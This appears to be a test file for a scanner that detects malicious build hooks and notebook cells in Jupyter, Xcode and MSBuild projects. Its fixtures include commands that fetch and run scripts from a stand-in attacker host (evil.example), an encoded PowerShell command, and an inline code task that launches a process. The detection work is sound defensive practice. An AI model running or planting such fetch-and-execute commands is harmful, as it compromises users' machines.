import { expect } from 'chai';
import { SeverityLevel } from '../lib/events/sec-events';
import { scanJupyterNotebook, scanXcodePbxproj, scanMsbuildProject } from '../detection/build-notebook-rules';

suite('Roadmap Stage 2 Builds & Notebooks', () => {
  suite('scanJupyterNotebook', () => {
    test('detects !curl and %%bash with base64 -d / nc', () => {
      const nb = JSON.stringify({
        cells: [
          { cell_type: 'code', source: ['!curl -s https://evil.example/a.sh | bash\n'] },
          { cell_type: 'code', source: '%%bash\necho aWQ= | base64 -d\n' },
        ],
      });
      const findings = scanJupyterNotebook(nb, 'analysis.ipynb');
      const magicFindings = findings.filter((f) => f.ruleId === 'jupyter_shell_magic_exec');
      expect(magicFindings).to.have.lengthOf(2);
      expect(magicFindings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('detects hidden/collapsed cell with os.system, subprocess, eval, exec, __import__', () => {
      const nb = JSON.stringify({
        cells: [
          { cell_type: 'code', metadata: { jupyter: { source_hidden: true } }, source: 'import os\nos.system("id")' },
          { cell_type: 'code', metadata: { collapsed: true }, source: ['exec("print(1)")'] },
        ],
      });
      const findings = scanJupyterNotebook(nb, 'hidden.ipynb');
      const hiddenFindings = findings.filter((f) => f.ruleId === 'jupyter_hidden_cell_exec');
      expect(hiddenFindings).to.have.lengthOf(2);
      expect(hiddenFindings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('detects unsafe deserialization with pickle/joblib/dill/cloudpickle', () => {
      const nb = JSON.stringify({
        cells: [
          { cell_type: 'code', source: 'import pickle\ndata = pickle.loads(raw)\n' },
          { cell_type: 'code', source: 'import joblib\nmodel = joblib.load("m.pkl")\n' },
        ],
      });
      const findings = scanJupyterNotebook(nb, 'model.ipynb');
      const deserFindings = findings.filter((f) => f.ruleId === 'jupyter_unsafe_deserialization');
      expect(deserFindings).to.have.lengthOf(2);
      expect(deserFindings[0].severity).to.equal(SeverityLevel.MEDIUM);
    });

    test('returns empty for clean or invalid notebooks', () => {
      const clean = JSON.stringify({
        cells: [{ cell_type: 'code', source: ['import math\n', 'print(math.sqrt(16))\n'] }],
      });
      expect(scanJupyterNotebook(clean, 'clean.ipynb')).to.deep.equal([]);
      expect(scanJupyterNotebook('{bad json', 'bad.ipynb')).to.deep.equal([]);
    });
  });

  suite('scanXcodePbxproj', () => {
    test('detects suspicious shellScript in PBXShellScriptBuildPhase', () => {
      const pbxproj = `
        /* Begin PBXShellScriptBuildPhase section */
        ABC123 /* Run Script */ = {
          isa = PBXShellScriptBuildPhase;
          shellPath = /bin/sh;
          shellScript = "curl -s https://evil.example/payload.sh | bash\\n";
        };
        /* End PBXShellScriptBuildPhase section */
      `;
      const findings = scanXcodePbxproj(pbxproj, 'App.xcodeproj/project.pbxproj');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('xcode_build_phase_suspicious_script');
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('returns empty for clean Xcode build phase', () => {
      const clean = `
        /* Begin PBXShellScriptBuildPhase section */
        ABC123 /* SwiftLint */ = {
          isa = PBXShellScriptBuildPhase;
          shellPath = /bin/sh;
          shellScript = "if which swiftlint >/dev/null; then\\n  swiftlint\\nfi\\n";
        };
      `;
      expect(scanXcodePbxproj(clean, 'App.xcodeproj/project.pbxproj')).to.deep.equal([]);
    });
  });

  suite('scanMsbuildProject', () => {
    test('detects suspicious Exec Command and PreBuildEvent Command', () => {
      const csproj = `
        <Project Sdk="Microsoft.NET.Sdk">
          <Target Name="PostBuild" AfterTargets="PostBuildEvent">
            <Exec Command="powershell -enc SQBFAFgA" />
          </Target>
          <PropertyGroup>
            <PreBuildEvent>
              <Command>Invoke-WebRequest https://evil.example/a.exe -OutFile a.exe</Command>
            </PreBuildEvent>
          </PropertyGroup>
        </Project>
      `;
      const findings = scanMsbuildProject(csproj, 'App.csproj');
      const execFindings = findings.filter((f) => f.ruleId === 'msbuild_suspicious_exec_task');
      expect(execFindings).to.have.lengthOf(2);
      expect(execFindings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('detects inline CodeTaskFactory / RoslynCodeTaskFactory', () => {
      const targets = `
        <Project>
          <UsingTask TaskName="EvilTask" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.Core.dll">
            <Task><Code Type="Fragment" Language="cs">System.Diagnostics.Process.Start("calc");</Code></Task>
          </UsingTask>
        </Project>
      `;
      const findings = scanMsbuildProject(targets, 'Directory.Build.targets');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('msbuild_inline_code_task');
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('returns empty for clean MSBuild project', () => {
      const clean = `
        <Project Sdk="Microsoft.NET.Sdk">
          <PropertyGroup>
            <TargetFramework>net8.0</TargetFramework>
          </PropertyGroup>
          <Target Name="EchoInfo" BeforeTargets="Build">
            <Exec Command="dotnet --info" />
          </Target>
        </Project>
      `;
      expect(scanMsbuildProject(clean, 'Clean.csproj')).to.deep.equal([]);
    });

    test('ignores markdown cells in Jupyter and libcurl/shasum in Xcode', () => {
      const mdNb = JSON.stringify({
        cells: [{ cell_type: 'markdown', source: '!curl https://example.com/a.sh | bash\n' }],
      });
      expect(scanJupyterNotebook(mdNb, 'docs.ipynb')).to.deep.equal([]);

      const cleanXcode = `/* Begin PBXShellScriptBuildPhase section */\nABC = { isa = PBXShellScriptBuildPhase; shellScript = "echo libcurl | shasum -a 256"; };`;
      expect(scanXcodePbxproj(cleanXcode, 'App.xcodeproj/project.pbxproj')).to.deep.equal([]);
    });
  });
});
